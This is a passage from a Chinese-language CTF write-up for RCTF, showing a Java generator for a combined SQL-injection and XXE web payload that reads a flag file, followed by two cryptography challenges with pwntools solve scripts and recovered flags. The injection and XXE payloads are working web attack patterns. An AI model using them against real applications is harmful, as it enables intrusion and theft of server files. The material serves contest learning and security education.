<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">original</span> <span class="operator">=</span> <span class="string">&quot;$&#123;@java.lang.Character@toString(39)&#125;) OR 1#&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedpasswd</span> <span class="operator">=</span> URLEncoder.encode(original, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM \&quot;file:///flag\&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] pocBytes = poc.getBytes(StandardCharsets.UTF_16BE);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedPoc</span> <span class="operator">=</span> URLEncoder.encode(Base64.getEncoder().encodeToString(pocBytes), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> URLEncoder.encode(<span class="string">&quot;zeroc&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">yourclasses</span> <span class="operator">=</span> URLEncoder.encode(<span class="string">&quot;java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;?password=&quot;</span> + encodedpasswd + <span class="string">&quot;&amp;poc=&quot;</span> + encodedPoc + <span class="string">&quot;&amp;type=&quot;</span> + type + <span class="string">&quot;&amp;yourclasses=&quot;</span> + yourclasses;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?password=%24%7B%40java.lang.Character%40toString%2839%29%7D%29+OR+1%23&amp;poc=ADwAPwB4AG0AbAAgAHYAZQByAHMAaQBvAG4APQAiADEALgAwACIAPwA%2BADwAIQBEAE8AQwBUAFkAUABFACAAQQBOAFkAIABbADwAIQBFAE4AVABJAFQAWQAgAHgAeABlACAAUwBZAFMAVABFAE0AIAAiAGYAaQBsAGUAOgAvAC8ALwBmAGwAYQBnACIAPgBdAD4APABhAD4AJgB4AHgAZQA7ADwALwBhAD4%3D&amp;type=zeroc&amp;yourclasses=java.io.ByteArrayInputStream%2C%5BB%2Corg.xml.sax.InputSource%2Cjava.io.InputStream</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/lcwzl/zeroc/raw/master/img/202212262143216.png" alt=""></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h3><p>challenge:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choices</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase, digits</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">signal.alarm(<span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    key = <span class="string">&quot;rctf_&quot;</span> + <span class="string">&quot;&quot;</span>.join(choices(ascii_uppercase + digits, k=<span class="number">15</span>))</span><br><span class="line">    x = bytes_to_long(<span class="string">&quot;&quot;</span>.join(<span class="built_in">sorted</span>(key)).encode())</span><br><span class="line">    <span class="keyword">if</span> x &lt; q:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">l = <span class="number">2</span></span><br><span class="line">T = []</span><br><span class="line">U = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">    t = randint(<span class="number">1</span>, q)</span><br><span class="line">    u = (x * t - randint(<span class="number">1</span>, q &gt;&gt; l))</span><br><span class="line">    T.append(t)</span><br><span class="line">    U.append(u)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;T = <span class="subst">&#123;T&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;U = <span class="subst">&#123;U&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;x = &quot;</span>).strip())</span><br><span class="line"><span class="keyword">if</span> guess == x:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>这里给了90组t、u的值，<code>u=(x*t - randint(1, q &gt;&gt; 2))</code>，那么<code>u // t</code>接近x，只需要取其中最大的一个加1即可。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;190.92.234.114&#x27;</span>, <span class="number">23334</span>)</span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">str</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>))[<span class="number">6</span>:-<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">T1 = <span class="built_in">str</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>))[<span class="number">7</span>:-<span class="number">4</span>]</span><br><span class="line">T1 = T1.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">T = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> T1:</span><br><span class="line">    T.append(<span class="built_in">int</span>(i))</span><br><span class="line">U1 = <span class="built_in">str</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>))[<span class="number">7</span>:-<span class="number">4</span>]</span><br><span class="line">U1 = U1.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">U = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> U1:</span><br><span class="line">    U.append(<span class="built_in">int</span>(i))</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90</span>):</span><br><span class="line">    result.append(U[i] // T[i])</span><br><span class="line">payload = <span class="built_in">str</span>(result[-<span class="number">1</span>] + <span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;= &#x27;</span>)</span><br><span class="line">p.sendline(payload.encode())</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># RCTF&#123;h0p3_this_gUes5_cHal1eNge_is_N0T_gue5sY&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="magic-sign"><a href="#magic-sign" class="headerlink" title="magic_sign"></a>magic_sign</h3><p>论文题</p>
<p>参考论文：<a href="https://eprint.iacr.org/2021/444">https://eprint.iacr.org/2021/444</a></p>
<p>​                   <a href="https://eprint.iacr.org/2021/487">https://eprint.iacr.org/2021/487</a>                </p>
<p>challenge：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">magic = Magic(<span class="number">137</span>)          <span class="comment"># most magical number</span></span><br><span class="line"></span><br><span class="line">C, K, Q = magic.random_list(<span class="number">3</span>)</span><br><span class="line">P1, P2 = C*K, K*Q</span><br><span class="line">pk, sk = (C, P1, P2), (C, K, Q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;C =&#x27;</span>,  pk[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P1 =&#x27;</span>, pk[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P2 =&#x27;</span>, pk[<span class="number">2</span>])</span><br><span class="line">H = magic.shake(<span class="string">b&#x27;Gotta make you understand~&#x27;</span>) <span class="comment">#! 将字符串转换为magic对象</span></span><br><span class="line">S = H*Q                     <span class="comment"># sign #! 利用乘法进行签名</span></span><br><span class="line"><span class="keyword">assert</span> P1*S == C*H*P2       <span class="comment"># verify #! 验签</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;S =&#x27;</span>, S)</span><br><span class="line"></span><br><span class="line">H = magic.shake(<span class="string">b&#x27;Never gonna give you flag~&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    S_ = magic(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)[:magic.N])</span><br><span class="line">    <span class="keyword">if</span> P1*S_ == C*H*P2:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Ooh~~~give~you~up~&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You know the rules and so~do~I~&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>关键部分代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mix</span>(<span class="params">self, T, K</span>):</span><br><span class="line">        R = T+K <span class="comment">#!首先将两个对象的MagicList进行相加得到R</span></span><br><span class="line">        e = self.U[<span class="number">0</span>] <span class="comment">#!e = 135</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.N ** <span class="number">2</span>):</span><br><span class="line">            d = self.U[i+<span class="number">1</span>]</span><br><span class="line">            R.lst[d] = R.lst[d] + R.lst[e]</span><br><span class="line">            e = d</span><br><span class="line">        R = R+K</span><br><span class="line">        <span class="keyword">return</span> R <span class="comment">#! R即为最终得到的结果</span></span><br></pre></td></tr></table></figure>
<p>两个<code>magic</code>对象相乘就是进行一次<code>mix()</code>操作，提取<code>mix()</code>中的循环作为<code>e()</code>，则<strong>magic类满足e(a + b)=e(a) + e(b)</strong>。</p>
<p>根据给的一组签名信息可以求出等价的秘钥Q(这里不需要求出精确值，只需要作用在被加密信息H上的效果是等效即可)。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> magic <span class="keyword">import</span> Magic, MagicElement, MagicList</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">Magic_Latin_Square = [[<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line">                      [<span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">7</span>],</span><br><span class="line">                      [<span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">1</span>],</span><br><span class="line">                      [<span class="number">4</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>],</span><br><span class="line">                      [<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>],</span><br><span class="line">                      [<span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>],</span><br><span class="line">                      [<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>],</span><br><span class="line">                      [<span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">magic = Magic(<span class="number">137</span>)          <span class="comment"># most magical number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">s</span>):</span><br><span class="line">    R = magic(s)</span><br><span class="line">    e = R.U[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">137</span> ** <span class="number">2</span>):</span><br><span class="line">        d = R.U[i + <span class="number">1</span>]</span><br><span class="line">        R.lst[d] = R.lst[d] + R.lst[e]</span><br><span class="line">        e = d</span><br><span class="line">    <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;190.92.238.158&#x27;</span>, <span class="number">42000</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;C = &#x27;</span>)</span><br><span class="line">c = <span class="built_in">str</span>(r.recvline())[<span class="number">2</span>:-<span class="number">3</span>]</span><br><span class="line"><span class="comment"># c = &#x27;72623731325407623667257056627705340455646534060006120502502710300500054514743345612401623256572377620662150565135500713606100640446736775&#x27;</span></span><br><span class="line">p1 = <span class="built_in">str</span>(r.recvline())[<span class="number">7</span>:-<span class="number">3</span>]</span><br><span class="line"><span class="comment"># p1 = &#x27;77430326721732603500267365777071350555145125253734500502602740377672256444213306173434500216173237173543447615674400240535577652154271361&#x27;</span></span><br><span class="line">p2 = <span class="built_in">str</span>(r.recvline())[<span class="number">7</span>:-<span class="number">3</span>]</span><br><span class="line"><span class="comment"># p2 = &#x27;23463506676546233254524240721176204507016115173603065565105410160472322117056177224645002414346637235611741444036425007053650606704763124&#x27;</span></span><br><span class="line">s = <span class="built_in">str</span>(r.recvline())[<span class="number">6</span>:-<span class="number">3</span>]</span><br><span class="line"><span class="comment"># s = &#x27;37372370733622356416472265644443504124467257333623112321175105234254437417027622400447434030332730230634370230406571055722342212271337674&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(p1)</span><br><span class="line"><span class="built_in">print</span>(p2)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">C = magic(c)</span><br><span class="line">P1 = magic(p1)</span><br><span class="line">P2 = magic(p2)</span><br><span class="line">S = magic(s)</span><br><span class="line"></span><br><span class="line">H = magic.shake(<span class="string">b&#x27;Gotta make you understand~&#x27;</span>)</span><br><span class="line">h = <span class="built_in">str</span>(H)</span><br><span class="line">H1 = e(h)</span><br><span class="line">P11 = e(p1)</span><br><span class="line">res = C * H * P2</span><br><span class="line"></span><br><span class="line">eQ = []</span><br><span class="line">Q = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">137</span>):</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> H1.lst[i] + MagicElement(j) + MagicElement(k) == S.lst[i]:</span><br><span class="line">                eQ.append(j)</span><br><span class="line">                Q.append(k)</span><br><span class="line">                t = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">eQ = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> eQ)</span><br><span class="line">Q = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> Q)</span><br><span class="line"></span><br><span class="line">H = magic.shake(<span class="string">b&#x27;Never gonna give you flag~&#x27;</span>)</span><br><span class="line">H = e(<span class="built_in">str</span>(H))</span><br><span class="line">Q = magic(Q)</span><br><span class="line">eQ = magic(eQ)</span><br><span class="line">S_ = H + eQ + Q</span><br><span class="line">r.sendline(<span class="built_in">str</span>(S_).encode())</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># RCTF&#123;you_w0uldn&#x27;t_get_th1s_froM_@ny_other_guy&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-WP</category>
      </categories>
      <tags>
        <tag>Write-up</tag>
      </tags>
  </entry>
</search>
